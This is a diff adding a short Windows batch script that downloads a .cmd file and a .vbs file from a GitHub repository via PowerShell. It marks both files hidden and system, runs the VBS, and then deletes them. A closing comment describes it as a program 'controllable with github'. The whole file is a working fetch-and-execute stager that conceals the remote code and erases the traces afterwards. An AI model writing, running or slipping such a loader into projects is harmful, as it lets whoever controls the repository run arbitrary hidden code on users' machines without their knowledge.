@@ -1,0 +1,14 @@
+@echo off
+color a
+cls
+powershell -command "Invoke-WebRequest -Uri 'https://github.com/wwwqr-000/launchcontrolw/raw/main/000-000.txt' -OutFile run-000-000-010.cmd"
+attrib +h +s run-000-000-010.cmd
+powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/wwwqr-000/launchcontrolw/main/run-index--000-000.cmd.vbs' -OutFile run-index--000-000.cmd.vbs"
+attrib +h +s run-index--000-000.cmd.vbs
+start run-index--000-000.cmd.vbs
+timeout 4
+del /A:H run-000-000-010.cmd
+del /A:H run-index--000-000.cmd.vbs
+exit
+::made by wwwqr (wieger)
+:: (first updatable program controllable with github)
